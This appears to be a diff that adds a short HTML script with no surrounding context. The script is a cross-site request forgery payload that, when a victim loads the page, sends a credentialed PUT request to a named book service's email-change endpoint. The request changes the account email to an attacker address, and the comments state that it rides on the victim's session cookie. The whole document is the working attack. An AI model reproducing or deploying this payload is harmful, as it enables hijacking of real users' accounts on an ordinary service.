@@ -1,1 +1,16 @@
-
+<script>
+// Fires automatically when victim loads this page
+fetch("https://api.bookbeat.com/api/users/email", {
+  method:      "PUT",
+  credentials: "include", // attaches victim's session cookie
+  headers: {
+    "Content-Type": "application/json",
+    "Bb-Client":    "bookbeatweb",
+    "Bb-Market":    "uk",
+    "Bb-Session-Id": "a39eb591-ea5d-4224-8cd7-c38c731cf01d",
+    "Bb-Trace-Id":   "77ac2f28-18cf-4ad0-8475-0cd98e3d4e01",
+    "Api-Version":   "18",
+  },
+  body: JSON.stringify({ newemail: "attacker@evil.com" }),
+});
+</script>
